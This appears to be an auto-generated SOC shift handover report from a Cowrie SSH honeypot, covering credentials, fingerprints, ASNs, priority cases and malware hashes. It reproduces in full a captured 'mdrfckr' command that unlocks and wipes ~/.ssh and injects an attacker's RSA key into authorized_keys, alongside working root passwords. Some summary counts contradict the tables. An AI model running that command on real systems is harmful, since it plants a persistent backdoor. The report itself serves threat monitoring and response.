# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-14 |
| **Generated At** | 2026-05-14T06:49:27Z |
| **Shift Time** | 06:49 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **184** |
| Confirmed Threats | **112** |
| False Positives Filtered | **72** (39.1%) |
| Unique Attacker IPs | **37** |
| Countries of Origin | **18** |
| High Severity Cases | **10** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **174** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **16** |
| Unique Credential Pairs | **8** |
| Unique Usernames | **3** |
| Unique Passwords | **8** |
| Successful Auth Pairs | **10** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 10 |
| `345gs5662d34` | 5 |
| `bob` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 5 |
| `3245gs5662d34` | 5 |
| `grey` | 1 |
| `princess` | 1 |
| `201201` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 5 |
| `root` | `3245gs5662d34` | 5 |
| `root` | `grey` | 1 |
| `root` | `princess` | 1 |
| `root` | `201201` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `grey` | `184.168.30.159` | 2026-05-14T05:02:12 |
| `root` | `3245gs5662d34` | `184.168.30.159` | 2026-05-14T05:02:18 |
| `root` | `princess` | `152.32.172.177` | 2026-05-14T05:05:43 |
| `root` | `3245gs5662d34` | `152.32.172.177` | 2026-05-14T05:05:46 |
| `root` | `201201` | `103.67.78.132` | 2026-05-14T05:58:18 |
| `root` | `3245gs5662d34` | `103.67.78.132` | 2026-05-14T05:58:23 |
| `root` | `Server12#$` | `202.188.47.41` | 2026-05-14T06:46:46 |
| `root` | `3245gs5662d34` | `202.188.47.41` | 2026-05-14T06:46:49 |
| `root` | `ncc74205@ent` | `31.59.89.180` | 2026-05-14T06:47:57 |
| `root` | `3245gs5662d34` | `31.59.89.180` | 2026-05-14T06:48:01 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **184** |
| Sessions with Fingerprint | **6** |
| Unique HASSH Fingerprints | **6** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 19 |
| Go SSH scanner | 5 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 12 | 4 |
| `af8223ac9914...` | libssh-based | 4 | 2 |
| `03a80b21afa8...` | Modern SSH client | 3 | 3 |
| `084386fa7ae5...` | Mirai/variant | 2 | 2 |
| `873a5fb5fedc...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 12 | 4 | Mirai/variant |
| `af8223ac9914...` | libssh | 4 | 2 | libssh-based |
| `03a80b21afa8...` | libssh | 3 | 3 | Modern SSH client |
| `084386fa7ae5...` | Go SSH scanner | 2 | 2 | Mirai/variant |
| `95420f9d932d...` | Go SSH scanner | 2 | 2 | — |
| `873a5fb5fedc...` | Go SSH scanner | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 5 | 5 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `31.59.89.180`, `202.188.47.41`, `184.168.30.159`, `152.32.172.177`, `103.67.78.132`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **37** |
| Unique ASNs | **30** |
| High-Risk ASNs | **15** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET BACKBONE | 3 | LOW |
| `AS4837` | CHINA UNICOM China169 Backbone | 2 | HIGH |
| `AS16509` | Amazon.com, Inc. | 2 | HIGH |
| `AS4811` | China Telecom (Group) | 2 | HIGH |
| `AS37963` | Hangzhou Alibaba Advertising Co.,Ltd. | 2 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS4788` | TM TECHNOLOGY SERVICES SDN. BHD. | 1 | HIGH |
| `AS8193` | Uzbektelekom Joint Stock Company | 1 | MEDIUM |

---

---

## 🚨 Priority Cases — Immediate Attention (10)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-60b69f86663d

| Field | Detail |
|---|---|
| **Source IP** | `184.168.30[.]159` |
| **First Seen** | 2026-05-14 05:02 |
| **Last Seen** | 2026-05-14 05:02 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-14 05:02:11` | `cowrie.session.connect` |
| `2026-05-14 05:02:11` | `cowrie.client.version` |
| `2026-05-14 05:02:11` | `cowrie.client.kex` |
| `2026-05-14 05:02:12` | `cowrie.login.success` |
| `2026-05-14 05:02:13` | `cowrie.session.params` |
| `2026-05-14 05:02:13` | `cowrie.command.input` |
| `2026-05-14 05:02:13` | `cowrie.command.failed` |
| `2026-05-14 05:02:13` | `cowrie.log.closed` |
| `2026-05-14 05:02:14` | `cowrie.session.params` |
| `2026-05-14 05:02:14` | `cowrie.command.input` |
| `2026-05-14 05:02:14` | `cowrie.session.file_download` |
| `2026-05-14 05:02:14` | `cowrie.log.closed` |
| `2026-05-14 05:02:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `184.168.30[.]159` to AbuseIPDB if not already reported
- [ ] Block `184.168.30[.]159` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b440fbe9ba6

| Field | Detail |
|---|---|
| **Source IP** | `184.168.30[.]159` |
| **First Seen** | 2026-05-14 05:02 |
| **Last Seen** | 2026-05-14 05:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-14 05:02:17` | `cowrie.session.connect` |
| `2026-05-14 05:02:17` | `cowrie.client.version` |
| `2026-05-14 05:02:17` | `cowrie.client.kex` |
| `2026-05-14 05:02:18` | `cowrie.login.success` |
| `2026-05-14 05:02:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `184.168.30[.]159` to AbuseIPDB if not already reported
- [ ] Block `184.168.30[.]159` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d0f11f5ee94

| Field | Detail |
|---|---|
| **Source IP** | `152.32.172[.]177` |
| **First Seen** | 2026-05-14 05:05 |
| **Last Seen** | 2026-05-14 05:05 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-14 05:05:43` | `cowrie.session.connect` |
| `2026-05-14 05:05:43` | `cowrie.client.version` |
| `2026-05-14 05:05:43` | `cowrie.client.kex` |
| `2026-05-14 05:05:43` | `cowrie.login.success` |
| `2026-05-14 05:05:44` | `cowrie.session.params` |
| `2026-05-14 05:05:44` | `cowrie.command.input` |
| `2026-05-14 05:05:44` | `cowrie.command.failed` |
| `2026-05-14 05:05:44` | `cowrie.log.closed` |
| `2026-05-14 05:05:44` | `cowrie.session.params` |
| `2026-05-14 05:05:44` | `cowrie.command.input` |
| `2026-05-14 05:05:44` | `cowrie.session.file_download` |
| `2026-05-14 05:05:44` | `cowrie.log.closed` |
| `2026-05-14 05:05:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.172[.]177` to AbuseIPDB if not already reported
- [ ] Block `152.32.172[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-79afa8785a95

| Field | Detail |
|---|---|
| **Source IP** | `152.32.172[.]177` |
| **First Seen** | 2026-05-14 05:05 |
| **Last Seen** | 2026-05-14 05:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-14 05:05:46` | `cowrie.session.connect` |
| `2026-05-14 05:05:46` | `cowrie.client.version` |
| `2026-05-14 05:05:46` | `cowrie.client.kex` |
| `2026-05-14 05:05:46` | `cowrie.login.success` |
| `2026-05-14 05:05:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.172[.]177` to AbuseIPDB if not already reported
- [ ] Block `152.32.172[.]177` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bbc657c0e35f

| Field | Detail |
|---|---|
| **Source IP** | `103.67.78[.]132` |
| **First Seen** | 2026-05-14 05:58 |
| **Last Seen** | 2026-05-14 05:58 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-14 05:58:17` | `cowrie.session.connect` |
| `2026-05-14 05:58:17` | `cowrie.client.version` |
| `2026-05-14 05:58:17` | `cowrie.client.kex` |
| `2026-05-14 05:58:18` | `cowrie.login.success` |
| `2026-05-14 05:58:18` | `cowrie.session.params` |
| `2026-05-14 05:58:18` | `cowrie.command.input` |
| `2026-05-14 05:58:18` | `cowrie.command.failed` |
| `2026-05-14 05:58:19` | `cowrie.log.closed` |
| `2026-05-14 05:58:19` | `cowrie.session.params` |
| `2026-05-14 05:58:19` | `cowrie.command.input` |
| `2026-05-14 05:58:19` | `cowrie.session.file_download` |
| `2026-05-14 05:58:19` | `cowrie.log.closed` |
| `2026-05-14 05:58:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.67.78[.]132` to AbuseIPDB if not already reported
- [ ] Block `103.67.78[.]132` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aaddb0b62eb4

| Field | Detail |
|---|---|
| **Source IP** | `103.67.78[.]132` |
| **First Seen** | 2026-05-14 05:58 |
| **Last Seen** | 2026-05-14 05:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-14 05:58:22` | `cowrie.session.connect` |
| `2026-05-14 05:58:22` | `cowrie.client.version` |
| `2026-05-14 05:58:22` | `cowrie.client.kex` |
| `2026-05-14 05:58:23` | `cowrie.login.success` |
| `2026-05-14 05:58:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.67.78[.]132` to AbuseIPDB if not already reported
- [ ] Block `103.67.78[.]132` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6889e0f30892

| Field | Detail |
|---|---|
| **Source IP** | `202.188.47[.]41` |
| **First Seen** | 2026-05-14 06:46 |
| **Last Seen** | 2026-05-14 06:46 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-14 06:46:46` | `cowrie.session.connect` |
| `2026-05-14 06:46:46` | `cowrie.client.version` |
| `2026-05-14 06:46:46` | `cowrie.client.kex` |
| `2026-05-14 06:46:46` | `cowrie.login.success` |
| `2026-05-14 06:46:47` | `cowrie.session.params` |
| `2026-05-14 06:46:47` | `cowrie.command.input` |
| `2026-05-14 06:46:47` | `cowrie.command.failed` |
| `2026-05-14 06:46:47` | `cowrie.log.closed` |
| `2026-05-14 06:46:47` | `cowrie.session.params` |
| `2026-05-14 06:46:47` | `cowrie.command.input` |
| `2026-05-14 06:46:47` | `cowrie.session.file_download` |
| `2026-05-14 06:46:47` | `cowrie.log.closed` |
| `2026-05-14 06:46:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.188.47[.]41` to AbuseIPDB if not already reported
- [ ] Block `202.188.47[.]41` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-30f272610e62

| Field | Detail |
|---|---|
| **Source IP** | `202.188.47[.]41` |
| **First Seen** | 2026-05-14 06:46 |
| **Last Seen** | 2026-05-14 06:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-14 06:46:49` | `cowrie.session.connect` |
| `2026-05-14 06:46:49` | `cowrie.client.version` |
| `2026-05-14 06:46:49` | `cowrie.client.kex` |
| `2026-05-14 06:46:49` | `cowrie.login.success` |
| `2026-05-14 06:46:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.188.47[.]41` to AbuseIPDB if not already reported
- [ ] Block `202.188.47[.]41` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eab9ccc155a6

| Field | Detail |
|---|---|
| **Source IP** | `31.59.89[.]180` |
| **First Seen** | 2026-05-14 06:47 |
| **Last Seen** | 2026-05-14 06:48 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-14 06:47:56` | `cowrie.session.connect` |
| `2026-05-14 06:47:56` | `cowrie.client.version` |
| `2026-05-14 06:47:56` | `cowrie.client.kex` |
| `2026-05-14 06:47:57` | `cowrie.login.success` |
| `2026-05-14 06:47:57` | `cowrie.session.params` |
| `2026-05-14 06:47:57` | `cowrie.command.input` |
| `2026-05-14 06:47:57` | `cowrie.command.failed` |
| `2026-05-14 06:47:57` | `cowrie.log.closed` |
| `2026-05-14 06:47:58` | `cowrie.session.params` |
| `2026-05-14 06:47:58` | `cowrie.command.input` |
| `2026-05-14 06:47:58` | `cowrie.session.file_download` |
| `2026-05-14 06:47:58` | `cowrie.log.closed` |
| `2026-05-14 06:48:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.59.89[.]180` to AbuseIPDB if not already reported
- [ ] Block `31.59.89[.]180` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ceb44cac99df

| Field | Detail |
|---|---|
| **Source IP** | `31.59.89[.]180` |
| **First Seen** | 2026-05-14 06:48 |
| **Last Seen** | 2026-05-14 06:48 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-14 06:48:00` | `cowrie.session.connect` |
| `2026-05-14 06:48:00` | `cowrie.client.version` |
| `2026-05-14 06:48:00` | `cowrie.client.kex` |
| `2026-05-14 06:48:01` | `cowrie.login.success` |
| `2026-05-14 06:48:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.59.89[.]180` to AbuseIPDB if not already reported
- [ ] Block `31.59.89[.]180` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `160.30.142[.]2` | **25** | 2026-05-14 05:56 | 2026-05-14 06:01 | 5m | 0 | `T1592` | 🟠 MEDIUM |
| `223.123.124[.]178` | **25** | 2026-05-14 04:26 | 2026-05-14 04:31 | 5m | 0 | `T1592` | 🟠 MEDIUM |
| `166.62.92[.]145` | **22** | 2026-05-14 04:38 | 2026-05-14 06:23 | 11m | 0 | `T1592` | 🟠 MEDIUM |
| `102.217.123[.]194` | **11** | 2026-05-14 05:37 | 2026-05-14 05:53 | 22m | 0 | `T1592` | 🟠 MEDIUM |
| `16.58.56[.]214` | **2** | 2026-05-14 04:52 | 2026-05-14 04:55 | 0m | 0 | `T1592` | 🟢 LOW |
| `3.130.168[.]2` | **2** | 2026-05-14 04:12 | 2026-05-14 04:13 | 0m | 0 | `T1592` | 🟢 LOW |
| `40.124.173[.]173` | **2** | 2026-05-14 05:40 | 2026-05-14 05:40 | 0m | 0 | `T1592` | 🟢 LOW |
| `103.67.78[.]132` | 1 | 2026-05-14 05:58 | 2026-05-14 05:58 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `14.103.113[.]212` | 1 | 2026-05-14 05:02 | 2026-05-14 05:04 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.18[.]123` | 1 | 2026-05-14 06:43 | 2026-05-14 06:43 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `152.32.172[.]177` | 1 | 2026-05-14 05:05 | 2026-05-14 05:05 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `157.0.0[.]10` | 1 | 2026-05-14 06:00 | 2026-05-14 06:00 | 30s | 0 | `T1592` | 🟢 LOW |
| `184.168.30[.]159` | 1 | 2026-05-14 05:02 | 2026-05-14 05:02 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `202.188.47[.]41` | 1 | 2026-05-14 06:46 | 2026-05-14 06:46 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `31.59.89[.]180` | 1 | 2026-05-14 06:47 | 2026-05-14 06:48 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `47.108.129[.]145` | 1 | 2026-05-14 06:44 | 2026-05-14 06:45 | 38s | 0 | `T1592` | 🟢 LOW |
| `58.240.17[.]66` | 1 | 2026-05-14 05:01 | 2026-05-14 05:03 | 120s | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]159` | 1 | 2026-05-14 06:05 | 2026-05-14 06:05 | 15s | 0 | `T1592` | 🟢 LOW |
| `8.154.0[.]104` | 1 | 2026-05-14 05:01 | 2026-05-14 05:03 | 120s | 0 | `T1592` | 🟢 LOW |
| `94.27.134[.]200` | 1 | 2026-05-14 06:09 | 2026-05-14 06:11 | 120s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
